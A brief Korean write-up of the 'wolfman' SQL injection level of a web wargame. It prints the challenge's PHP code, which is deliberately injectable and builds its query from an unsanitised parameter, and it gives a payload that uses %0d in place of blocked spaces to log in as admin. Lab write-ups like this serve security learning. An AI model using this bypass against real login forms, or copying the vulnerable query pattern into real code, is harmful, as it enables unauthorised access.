# wolfman

소스코드는 다음과 같다.

```php
<?php 
    include "./config.php"; 
    login_chk(); 
    $db = dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
    $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
    if($result['id'] == 'admin') solve("wolfman"); 
    highlight_file(__FILE__); 
?>
```

`id`가 `admin`으로 로그인이 된다면, 문제가 풀린다. `preg_match`를 보니 `whitespace`에 대해 `escape`를 해야한다.

> ?pw=' or id='admin 에서 공백을 %0d로 채워준다.
>
> ?pw='%0dor%0did='admin

`where`문이 True가 되어 클리어!

